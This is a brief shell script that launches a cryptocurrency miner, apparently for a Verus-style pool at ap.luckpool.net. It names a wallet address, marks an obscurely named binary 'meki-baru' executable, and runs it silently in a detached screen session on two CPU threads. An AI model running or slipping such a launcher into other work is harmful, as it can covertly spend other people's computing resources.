POOL=ap.luckpool.net:3956

WALLET=RR6U3T7Uz475i7gontznFLWikFsQan2wjC
WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-NoName)
chmod +x meki-baru

screen -dmS running ./meki-baru -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.NoName -p x --cpu 2
